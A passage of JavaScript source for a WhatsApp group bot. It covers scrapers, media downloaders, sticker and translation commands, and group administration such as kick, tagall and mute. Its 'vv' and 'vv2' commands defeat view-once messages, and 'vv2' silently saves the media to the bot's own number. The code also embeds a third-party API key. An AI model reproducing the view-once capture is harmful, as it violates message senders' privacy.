                    no_fetch_context_on_resource: false
                },
                context: {}
            }),
            _: Date.now()
        }

        const headers = {
            'accept': 'application/json, text/javascript, */*, q=0.01',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-US,en;q=0.9',
            'cookie': cookies,
            'dnt': '1',
            'referer': 'https://www.pinterest.com/',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
            'sec-ch-ua-full-version-list': '"Not(A:Brand";v="99.0.0.0", "Microsoft Edge";v="133.0.3065.92", "Chromium";v="133.0.6943.142"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
            'x-app-version': 'c056fb7',
            'x-pinterest-appstate': 'active',
            'x-pinterest-pws-handler': 'www/[username]/[slug].js',
            'x-pinterest-source-url': '/hargr003/cat-pictures/',
            'x-requested-with': 'XMLHttpRequest'
        }

        const { data } = await axios.get(url, { httpsAgent: agent, headers, params })
        return data.resource_response.data.results
            .filter(v => v.images?.orig)
            .map(result => ({
                upload_by: result.pinner.username,
                fullname: result.pinner.full_name,
                followers: result.pinner.follower_count,
                caption: result.grid_title,
                image: result.images.orig.url,
                source: "https://id.pinterest.com/pin/" + result.id,
            }))
    } catch {
        return []
    }
}

async function catbox(content) {
  const { ext, mime } = (await fromBuffer(content)) || {};

  const formData = new BodyForm();
  const randomBytes = crypto.randomBytes(5).toString("hex");
  formData.append("reqtype", "fileupload");
  //formData.append("fileToUpload", blob, randomBytes + "." + ext);
  formData.append('fileToUpload', content, { filename: "tmp"+randomBytes + '.' + ext, contentType: mime });

  const response = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: formData,
    headers: {
      "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
      //...formData.getHeaders(),
    },
  });

  return await response.text();
}

async function dellCase(filePath, caseNameToRemove) {
    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            console.error('There is an error:', err);
            return;
        }

        const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
        const modifiedData = data.replace(regex, '');

        fs.writeFile(filePath, modifiedData, 'utf8', (err) => {
            if (err) {
                console.error('An error occurred while deleting the file:', err);
                return;
            }

            console.log(`The text of case '${caseNameToRemove}' has been removed from the file..`);
        });
    });
}


async function tiktokDl(url) {
	return new Promise(async (resolve, reject) => {
		try {
			let data = []
			function formatNumber(integer) {
				let numb = parseInt(integer)
				return Number(numb).toLocaleString().replace(/,/g, '.')
			}
			
			function formatDate(n, locale = 'en') {
				let d = new Date(n)
				return d.toLocaleDateString(locale, {
					weekday: 'long',
					day: 'numeric',
					month: 'long',
					year: 'numeric',
					hour: 'numeric',
					minute: 'numeric',
					second: 'numeric'
				})
			}
			
			let domain = 'https://www.tikwm.com/api/';
			let res = await (await axios.post(domain, {}, {
				headers: {
					'Accept': 'application/json, text/javascript, */*; q=0.01',
					'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
					'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
					'Origin': 'https://www.tikwm.com',
					'Referer': 'https://www.tikwm.com/',
					'Sec-Ch-Ua': '"Not)A;Brand" ;v="24" , "Chromium" ;v="116"',
					'Sec-Ch-Ua-Mobile': '?1',
					'Sec-Ch-Ua-Platform': 'Android',
					'Sec-Fetch-Dest': 'empty',
					'Sec-Fetch-Mode': 'cors',
					'Sec-Fetch-Site': 'same-origin',
					'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
					'X-Requested-With': 'XMLHttpRequest'
				},
				params: {
					url: url,
					count: 12,
					cursor: 0,
					web: 1,
					hd: 1
				}
			})).data.data
			if (res?.duration == 0) {
				res.images.map(v => {
					data.push({ type: 'photo', url: v })
				})
			} else {
				data.push({
					type: 'watermark',
					url: 'https://www.tikwm.com' + res?.wmplay || "/undefined",
				}, {
					type: 'nowatermark',
					url: 'https://www.tikwm.com' + res?.play || "/undefined",
				}, {
					type: 'nowatermark_hd',
					url: 'https://www.tikwm.com' + res?.hdplay || "/undefined"
				})
			}
			let json = {
				status: true,
				title: res.title,
				taken_at: formatDate(res.create_time).replace('1970', ''),
				region: res.region,
				id: res.id,
				durations: res.duration,
				duration: res.duration + ' Seconds',
				cover: 'https://www.tikwm.com' + res.cover,
				size_wm: res.wm_size,
				size_nowm: res.size,
				size_nowm_hd: res.hd_size,
				data: data,
				music_info: {
					id: res.music_info.id,
					title: res.music_info.title,
					author: res.music_info.author,
					album: res.music_info.album ? res.music_info.album : null,
					url: 'https://www.tikwm.com' + res.music || res.music_info.play
				},
				stats: {
					views: formatNumber(res.play_count),
					likes: formatNumber(res.digg_count),
					comment: formatNumber(res.comment_count),
					share: formatNumber(res.share_count),
					download: formatNumber(res.download_count)
				},
				author: {
					id: res.author.id,
					fullname: res.author.unique_id,
					nickname: res.author.nickname,
					avatar: 'https://www.tikwm.com' + res.author.avatar
				}
			}
			resolve(json)
		} catch (e) {
			
		}
	});
}



if (global.db.settings.autobio) {
            ednut.updateProfileStatus(`${botname} Have Been Running For ${runtime(process.uptime())}`).catch(_ => _)
        }
        
        //================= { PLUGINS } =================\\
        const pluginsLoader = async (directory) => {
            let plugins = [];
            const folders = fs.readdirSync(directory);
            
            folders.forEach(file => {
                const filePath = path.join(directory, file);
                
                if (filePath.endsWith(".js")) {
                    try {
                        const resolvedPath = require.resolve(filePath);
                        
                        if (require.cache[resolvedPath]) {
                            delete require.cache[resolvedPath];
                        }
                        
                        const plugin = require(filePath);
                        plugins.push(plugin);
                    } catch (error) {
                        console.log(`Error loading plugin ${filePath}:`, error);
                    }
                }
            });
            
            return plugins;
        };

        const pluginsDisable = true;
        const plugins = await pluginsLoader(path.resolve(__dirname, "../plugins/cjs"));

        const plug = {
            ednut,
            isOwner,
            command,
            isCmd,
            reply,
            addCountCmd,
            getPosiCmdUser,
            randomemoji,
            isCreator,
            example,
            quoted,
            reaction,
            text,
            fetchJson,
            args,
            isPremium,
            botNumber,
            pushname,
            isGroup: m.isGroup,
            isPrivate: !m.isGroup,
            isAdmins,
            isBotAdmins,
            pickRandom,
            prefix,
            catbox,
            ftroli,
            fkontak,
            runtime,
            from,
            reply2,
            reply4,
            generateWAMessageFromContent
        };

        for (let plugin of plugins) {
            if (plugin.command.find(e => e == command.toLowerCase())) {
                if (plugin.owner && !isCreator) {
                    return m.reply(mess.owner);
                }
                if (plugin.group && !plug.isGroup) {
                    return m.reply(mess.group);
                }
                if (plugin.private && !plug.isPrivate) {
                    return m.reply(mess.private);
                }
        
                if (plugin.limit) {
                    let user = global.db.users[m.sender];
                    if (!user || user.limit <= 0) {
                        return m.reply(mess.limit);
                    }
                    user.limit -= 1;
reply(`1 ʟɪᴍɪᴛ ᴅᴏᴡɴ!:

ʟɪᴍɪᴛ ʟᴇғᴛ ❦︎: ${global.db.users[m.sender].limit}`) 
                }
        
                if (typeof plugin.execute !== "function") return;
                await plugin.execute(m, plug);
            }
        }


        //================= { CONSOLE LOGS } =================\\
        if (m.message) {
            let header = chalk.black(chalk.bgHex("#ff5e78").bold(`\n🌟 ${ucapanWaktu} 🌟`));
            let title = chalk.white(chalk.bgHex("#4a69bd").bold("🚀 There is a message 🚀"));
            let date = chalk.cyanBright(`📅 DATE        : ${new Date().toLocaleString()}`);
            let sender = chalk.yellowBright(`🗣️ SENDERNAME : ${pushname}`);
            let jid = chalk.magentaBright(`👤 JIDS       : ${m.sender}`);

            if (isCmd && isCmd2 && !m.isGroup) {
                console.log(header);
                console.log(title);
                console.log(date);
                console.log(sender);
                console.log(jid);
                console.log(chalk.white("------------------------------------------"));
            } else if (m.isGroup) {
                let group = chalk.redBright(`🔍 MESS LOCATION : ${groupName}`);

                console.log(header);
                console.log(title);
                console.log(date);
                console.log(sender);
                console.log(jid);
                console.log(group);
                console.log(chalk.white("------------------------------------------"));
            }
        }


        if (isCmd && isCmd2 && !isUser) {
            pendaftar.push(m.sender)
            fs.writeFileSync('./start/lib/database/userNumber.json', JSON.stringify(pendaftar, null, 2))
        }


//================= { SWITCH CASE } =================\\
switch (command) {
//================= { MAIN COURSE } =================\\
case "play": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!text) return m.reply(example("past lives"))
await ednut.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytdl.ytmp3(`${res.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await ednut.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
await ednut.sendMessage(m.chat, {react: {text: '', key: m.key}})
} else {
return m.reply("Error! Result Not Found")
}
}
break
//================================================================================

case "video": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!text) return m.reply(example("past lives"))
await ednut.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytdl.ytmp4(`${res.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await ednut.sendMessage(m.chat, {video: {url: urlMp3}, ptv: false, mimetype: "video/mp4"}, {quoted: m})
await ednut.sendMessage(m.chat, {react: {text: '', key: m.key}})
} else {
return m.reply("Error! Result Not Found")
}
}
break

//===============================================================================

case "yts": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!text) return m.reply(example('past lives'))
await ednut.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n    *[ YouTube search result ⌛]*\n\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Duration :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await m.reply(teks)
await ednut.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//===============================================================================

case "ytmp3": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!text) return m.reply(example("youtube vid link"))
if (!text.startsWith("https://")) return m.reply("please input a valid youtube link")
await ednut.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})

var anu = await ytdl.ytmp3(`${text}`)

if (anu.status) {
let urlMp3 = anu.download.url
await ednut.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await ednut.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "ytmp4": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!text) return m.reply(example("youtube vid link"))
if (!text.startsWith("https://")) return m.reply("please input a valid YouTube link")
await ednut.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
var anu = await ytdl.ytmp4(`${text}`)

if (anu.status) {
let urlMp3 = anu.download.url
await ednut.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await ednut.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//===============================================================================

case 'mediafire': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!args[0]) return m.reply(example("https://www.mediafire.com/file/xxxxxxxxxx"))
if (!args[0].startsWith("https://")) return m.reply("please input a valid mediafire link")
await ednut.sendMessage(m.chat, {react: {text: '', key: m.key}})
try {
let url = args[0]
let api = await fetch(`https://api.agatz.xyz/api/mediafire?url=${url}`)
let res = await api.json()
let data = res.data[0]
let caption = `*MediaFire Downloader* -\n_Name: ${data.nama}_\n_Size: ${data.size}_\n_Extension: ${data.mime}_\n_Link: ${data.link}_`
await ednut.sendMessage(m.chat, { document: { url: data.link }, mimetype: data.mime, fileName: data.nama, caption: caption }, { quoted: m })
await ednut.sendMessage(m.chat, {react: {text: '', key: m.key}})
} catch (error) {
console.log(error)
m.reply(error)
}
} 
break
//================================================================================

case "tiktokmp3": case "ttmp3": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!text) return m.reply(example("input tiktok link"))
if (!text.startsWith('https://')) return m.reply("the link you input is invalid")
await ednut.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await ednut.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
await ednut.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error! Result Not Found"))
}
break

case 'tourl': case 'url':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || '';
  if (!mime) return m.reply(example(`reply to a media`))
  let media = await q.download();
  let tmphasil = await tmpfiles(media)
  m.reply(`*Link*: ${tmphasil}`);
}
break

//================================================================================


case "gitclone": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!text) return m.reply(example("https://github.com/ednut001/arch-md"))
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return m.reply("Link you input is invalid")
await ednut.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    ednut.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
    await ednut.sendMessage(m.chat, {react: {text: '', key: m.key}})
} catch (e) {
await m.reply(`Error! Repository not found`)
}}
break

//================================================================================


case "ssweb": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
const {
  screenshotV1, 
  screenshotV2,
  screenshotV3 
} = require('getscreenshot.js')
const fs = require('fs')
var data = await screenshotV2(text)
await ednut.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m})
}
break

//================================================================================

case "shortlink": case "shorturl": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
let res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `${res.data.toString()}`
return m.reply(link)
}
break


case "shortlink-dl": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
await ednut.sendMessage(m.chat, {text: a.url}, {quoted: m})
}
break

//================================================================================

case "idgc": case "cekidgc": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!m.isGroup) return m.reply(mess.group)
m.reply(m.chat)
}
break

//================================================================================

case "listgc": case "listgroup": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!isCreator) return
let teks = `\n *乂 List all group chat*\n`
let a = await ednut.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Name :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Open": "closed"}
* *Owner :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Already out"}\n`
}
return m.reply(teks)
}
break

//================================================================================

case "cekidch": case "idch": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!text) return m.reply(example("input channel link"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("please input a valid channel link")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await ednut.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Name :* ${res.name}
* *Total followers :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Verified" : "Not verified"}
`
return m.reply(teks)
}
break

//================================================================================

case "s": case "sticker": case "stiker": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!/image|video/gi.test(mime)) return m.reply(example("reply to a media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("video duration more than 15 seconds!")
var image = await ednut.downloadAndSaveMediaMessage(qmsg)
await ednut.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
break
//================================================================================

case "vv": case "readviewonce": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
    if (!m.quoted) {
        return m.reply(`*Reply to an image, video, or audio with the caption ${prefix + command}*`);
    }

    let mime = (m.quoted.msg || m.quoted).mimetype || '';
    try {
        if (/image/.test(mime)) {
            let media = await m.quoted.download();
            await ednut.sendMessage(m.chat, {
                image: media,
                caption: "",
            }, { quoted: m });

        } else if (/video/.test(mime)) {
            let media = await m.quoted.download();
            await ednut.sendMessage(m.chat, {
                video: media,
                caption: "",
            }, { quoted: m });

        } else if (/audio/.test(mime)) {
            let media = await m.quoted.download();
            await ednut.sendMessage(m.chat, {
                audio: media,
                mimetype: 'audio/mpeg',
                ptt: true // Set to true if you want to send as a voice note
            }, { quoted: m });

        } else {
            m.reply(`❌ Unsupported media type!\nReply to an image, video, or audio with *${prefix + command}*`);
        }
    } catch (err) {
        console.error('Error processing media:', err);
        m.reply(`❌ Failed to process media. Please try again.`);
    }
}
break

case "vv2": case "readviewonce2": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
    if (!m.quoted) {
        return m.reply(`*Reply to an image, video, or audio with the caption ${prefix + command}*`);
    }

    let mime = (m.quoted.msg || m.quoted).mimetype || '';
    try {
        if (/image/.test(mime)) {
            let media = await m.quoted.download();
            await ednut.sendMessage(botNumber, {
                image: media,
                caption: " ",
            }, { quoted: m });

        } else if (/video/.test(mime)) {
            let media = await m.quoted.download();
            await ednut.sendMessage(botNumber, {
                video: media,
                caption: "",
            }, { quoted: m });

        } else if (/audio/.test(mime)) {
            let media = await m.quoted.download();
            await ednut.sendMessage(botNumber, {
                audio: media,
                mimetype: 'audio/mpeg',
                ptt: true // Set to true if you want to send as a voice note
            }, { quoted: m });

        } else {
            m.reply(`❌ Unsupported media type!\nReply to an image, video, or audio with *${prefix + command}*`);
        }
    } catch (err) {
        console.error('Error processing media:', err);
        m.reply(`❌ Failed to process media. Please try again.`);
    }
}
break

case 'lyrics': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
    if (!q) return m.reply("❌ *Please provide a song name.*");
     try {
        const apiUrl = `https://draculazxy-xyzdrac.hf.space/api/Lyrics/?q=${encodeURIComponent(q)}`;
        const response = await axios.get(apiUrl);
        const { artist, song_name, thumbnail, lyrics } = response.data;

        let caption = `🎶 *Lyrics Found!* 🎶\n\n`;
        caption += `🎤 *Artist:* ${artist}\n`;
        caption += `🎵 *Song:* ${song_name}\n\n`;
        caption += `📜 *Lyrics:*\n${lyrics}`;

        await ednut.sendMessage(m.chat, { image: { url: thumbnail }, caption: caption }, { quoted: m });
    } catch (error) {
        console.error("Error fetching lyrics:", error);
        m.reply("❌ Error fetching lyrics. Please try again later.");
    }
} 
break;

//================================================================================

case "tr": case "translate": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return m.reply(example("en good night"))
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!text) return m.reply(example("en good night"))
if (args.length < 1) return m.reply(example("en good night"))
if (!m.quoted.text) return m.reply(example("en good night"))
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
m.reply(result[0])
}
} else {
return m.reply(example("en good night"))
}}
break

//================================================================================

case "tohd": case "hd": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!/image/.test(mime)) return m.reply(example("kindly reply to a media"))
await ednut.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
let foto = await ednut.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await ednut.sendMessage(m.chat, {image: result}, {quoted: m})
await fs.unlinkSync(foto)
await ednut.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================
case "add": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!m.isGroup) return m.reply(mess.group)
if (!isCreator) return m.reply(mess.owner)
if (!isBotAdmins) return m.reply(mess.botAdmin)
let input;
if (m.quoted) {
input = m.quoted.sender;
} else if (text) {
input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false;
} else {
return m.reply(example("234### or reply to the user's message"))
}
var onWa = await ednut.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("input a valid whatsapp number")
const metadata = await ednut.groupMetadata(m.chat)
const members = metadata.participants.map(p => p.id)
if (members.includes(input)) {
return m.reply(`${input.split("@")[0]} is already in the group.`)
} else {
await ednut.groupParticipantsUpdate(m.chat, [input], 'add')
return m.reply(`User ${input.split("@")[0]} added to the group chat`)
}
} 
break
//================================================================================

case "kick": case "fling": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isCreator && !isAdmins) return m.reply(mess.admin)
  if (!isBotAdmins) return m.reply(mess.botAdmin)
  if (text || m.quoted) {
    const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
    var onWa = await ednut.onWhatsApp(input.split("@")[0])
    if (onWa.length < 1) return m.reply("Input a valid WhatsApp number")
    const metadata = await ednut.groupMetadata(m.chat)
    const members = metadata.participants.map(p => p.id)
    if (!members.includes(input)) {
      await m.reply(`User ${input.split("@")[0]} is not in the group.`)
    } else {
      const res = await ednut.groupParticipantsUpdate(m.chat, [input], 'remove')
      await m.reply(`User ${input.split("@")[0]} removed from the group chat.`)
    }
  } else {
    return m.reply(example("@tag/reply"))
  }
} 
break
//================================================================================

case "leave": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
  if (!isCreator) return m.reply(mess.owner)
  if (!m.isGroup) return m.reply(mess.group)
  await sleep(2000)
  await ednut.groupLeave(m.chat)
} 
break

//================================================================================

case "resetlinkgc":  
case "revoke": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isCreator && !isAdmins) return m.reply(mess.admin)
await ednut.groupRevokeInvite(m.chat)
m.reply("Group link reset successfully ✅")
}
break

//================================================================================
case 'tagall': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isBotAdmins) return m.reply(mess.botAdmin)
  if (!isCreator && !isAdmins) return m.reply(mess.admin)
let teks = `✯ Message : ${q ? q : 'none'} ✫\n\n`
for (let mem of participants) {
teks += `${global.simbol} @${mem.id.split('@')[0]}\n`
}
await ednut.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break

case 'tagadmin': case 'listadmin': case 'admin':{
if (!isGroup) return reply(msg.group)
const groupAdmins = participants.filter(p => p.admin)
const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net'
    let text = `   
◊ Group Admins ◊
${global.simbol} ${listAdmin}
`.trim()
await ednut.sendMessage(m.chat, {text : text, mentions: [...groupAdmins.map(v => v.id), owner] }, {quoted: m})
}
break

//================================================================================

case "linkgc": 
case "grouplink":  {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await ednut.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await ednut.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//================================================================================

case "joingc": case "join": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply(example("group link"))
if (!text.includes("chat.whatsapp.com")) return m.reply("the given link is invalid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await ednut.groupAcceptInvite(result)
m.reply(`Successfully joined the group`)
}
break

//================================================================================

case "get": case "g": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply(example("https://example.com"))
let data = await fetchJson(text)
m.reply(JSON.stringify(data, null, 2))
}
break

//================================================================================

case "joinch": case "joinchannel": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!isCreator) return m.reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("channel link?"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return m.reply("input a valid channel link")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await ednut.newsletterMetadata("invite", result)
await ednut.newsletterFollow(res.id)
m.reply(`
* Channel followed successfully ✅*
* Ch name : *${res.name}*
* Total Sub : *${res.subscribers + 1}*
`)
}
break

//================================================================================

case "mute":
case "close": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isBotAdmins) return m.reply(mess.botAdmin)
  if (!isCreator && !isAdmins) return m.reply(mess.admin)
  if (m.metadata.announce == false) {
    await ednut.groupSettingUpdate(m.chat, 'announcement')
    m.reply(`Group has been muted!`)
  } else {
    m.reply(`Group is already muted!`)
  }
} 
break;

case "unmute":
case "open": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isBotAdmins) return m.reply(mess.botAdmin)
  if (!isCreator && !isAdmins) return m.reply(mess.admin)
  if (m.metadata.announce == true) {
    await ednut.groupSettingUpdate(m.chat, 'not_announcement')
    m.reply(`Group has been opened!`)
  } else {
    m.reply(`Group is already open!`)
  }
} 
break;


//================================================================================


case "ednut": case "creator": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
await ednut.sendContact(m.chat, ['2347036214381'], m)
}
break


//================================================================================

case "ping": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
